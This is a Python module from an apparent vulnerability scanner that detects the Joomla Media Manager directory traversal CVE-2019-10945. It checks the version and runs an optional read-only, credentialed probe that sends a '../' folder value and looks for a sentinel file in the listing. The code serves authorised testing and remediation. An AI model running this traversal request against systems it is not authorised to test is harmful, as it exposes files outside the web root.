from __future__ import annotations

import re
import urllib.parse
from typing import Any

from ...core.args import aggressive_value
from ...core.auth import joomla_admin_login
from ...core.http import HttpClient, normalize_url
from ...core.models import Confidence, Finding, Status
from ...core.versions import parse_version_required, parse_version_safe
from .advisory import passive_core_finding

CVE_ID = "CVE-2019-10945"
NAME = "Joomla core Media Manager directory traversal"
AFFECTED_RULE = "Joomla 1.5.0 through 3.9.4 (com_media folder parameter)"
REMEDIATION = "Upgrade to Joomla 3.9.5 or a newer supported release and restrict Media Manager access."
LIST_PATH = "/administrator/index.php?option=com_media&view=mediaList&tmpl=component"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parsed < parse_version_required("1.5.0"):
        return Status.NOT_AFFECTED
    return Status.LIKELY_VULNERABLE if parsed < parse_version_required("3.9.5") else Status.PATCHED


def _listed_names(body: str) -> set[str]:
    """Entry names the server enumerated into the list response."""
    names = set(re.findall(r'data-name="([^"]+)"', body))
    names.update(re.findall(r'class="[^"]*\bname\b[^"]*"[^>]*>\s*([^<\s]+)', body))
    return {name.strip() for name in names if name.strip()}


def run_safe_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
) -> Finding:
    """Read-only listing differential against a benign directory outside the media root.

    Requires an authorized test account and a sentinel directory whose known
    file name is not part of the supplied folder value, so a reflected marker
    cannot satisfy the proof. No file is created, changed, or deleted.
    """
    base = normalize_url(target_url)
    user = aggressive_value(aggressive_args, aggressive_command, "admin_user")
    password = aggressive_value(aggressive_args, aggressive_command, "admin_password")
    folder = (
        aggressive_value(
            aggressive_args, aggressive_command, "sentinel_folder", "../proofcms-sentinel"
        )
        or "../proofcms-sentinel"
    )
    sentinel = aggressive_value(aggressive_args, aggressive_command, "sentinel_file") or ""

    evidence: dict[str, Any] = {
        "sentinel_folder": folder,
        "sentinel_file": sentinel,
        "credentials_supplied": bool(user and password),
    }
    if not user or not password or not sentinel:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=False,
            proof_url=f"{base}{LIST_PATH}",
            evidence=evidence,
            detail=(
                "The read-only listing probe needs --aggressive-arg admin_user=..., "
                "admin_password=... and sentinel_file=<known file outside the media root>."
            ),
            action=REMEDIATION,
            vulnerability_type="Path Traversal",
        )
    if sentinel in folder:
        evidence["rejected_reflection_risk"] = True
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=False,
            evidence=evidence,
            detail="The sentinel file name appears in the folder value, so reflection cannot be ruled out.",
            action=REMEDIATION,
            vulnerability_type="Path Traversal",
        )

    client = HttpClient(base_url=base, timeout=timeout, proxy=proxy)
    logged_in = joomla_admin_login(
        client, "", user, password, timeout=timeout, strict_status=False
    )
    evidence["login_ok"] = logged_in
    if not logged_in:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            evidence=evidence,
            detail="The authorized test account could not be used to reach the Media Manager.",
            action=REMEDIATION,
            vulnerability_type="Path Traversal",
        )

    baseline = client.get(LIST_PATH, timeout=timeout)
    probe_url = f"{LIST_PATH}&folder={urllib.parse.quote(folder, safe='')}"
    probe = client.get(probe_url, timeout=timeout)
    baseline_body = str(baseline.get("body", ""))
    probe_body = str(probe.get("body", ""))
    baseline_names = _listed_names(baseline_body)
    probe_names = _listed_names(probe_body)
    evidence.update(
        {
            "baseline_status": baseline.get("status", 0),
            "probe_status": probe.get("status", 0),
            "baseline_listed": sorted(baseline_names)[:20],
            "probe_listed": sorted(probe_names)[:20],
            "sentinel_in_baseline": sentinel in baseline_body,
            "sentinel_in_probe": sentinel in probe_body,
            "sentinel_enumerated": sentinel in probe_names,
        }
    )
    confirmed = (
        probe.get("status") == 200
        and sentinel in probe_body
        and sentinel not in baseline_body
        and sentinel not in folder
    )
    if confirmed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.VULNERABLE,
            confidence=Confidence.CONFIRMED,
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{probe_url}",
            evidence=evidence,
            detail=(
                "The read-only Media Manager listing enumerated a known file from a directory "
                "outside the configured media root; the baseline listing did not contain it."
            ),
            action=REMEDIATION,
            vulnerability_type="Path Traversal",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=Status.NOT_CONFIRMED,
        confidence=Confidence.MEDIUM,
        component="Joomla core",
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{probe_url}",
        evidence=evidence,
        detail=(
            "The read-only listing did not expose the known sentinel file outside the media root "
            "(the input filter, view layer or patched containment may have blocked it)."
        ),
        action=REMEDIATION,
        vulnerability_type="Path Traversal",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    result = passive_core_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        joomla_version=joomla_version,
        classify=classify_version,
        remediation=REMEDIATION,
    )
    result.vulnerability_type = "Path Traversal"
    if not run_exploit_check:
        return result
    if exploit_mode != "safe":
        result.detail += " This module supports only the read-only safe listing probe."
        return result
    if result.status not in {Status.LIKELY_VULNERABLE, Status.INCONCLUSIVE}:
        result.detail += " Safe proof skipped because the detected Joomla release is not affected."
        return result
    probe = run_safe_probe(
        target_url,
        timeout=timeout,
        proxy=proxy,
        aggressive_args=aggressive_args,
        aggressive_command=aggressive_command,
    )
    probe.component_version = joomla_version
    return probe


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": "Joomla core",
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["1.5.0-3.9.4"],
        "exploit_available": True,
        "exploit_modes": ["safe"],
        "intrusive": True,
        "vulnerability_type": "Path Traversal",
        "module_version": "2.0.0",
        "last_reviewed": "2026-11-22",
        "updated": "2026-11-22",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2019-10945",
            "https://developer.joomla.org/security-centre/777-20190401-core-directory-traversal-in-com-media.html",
        ],
    }
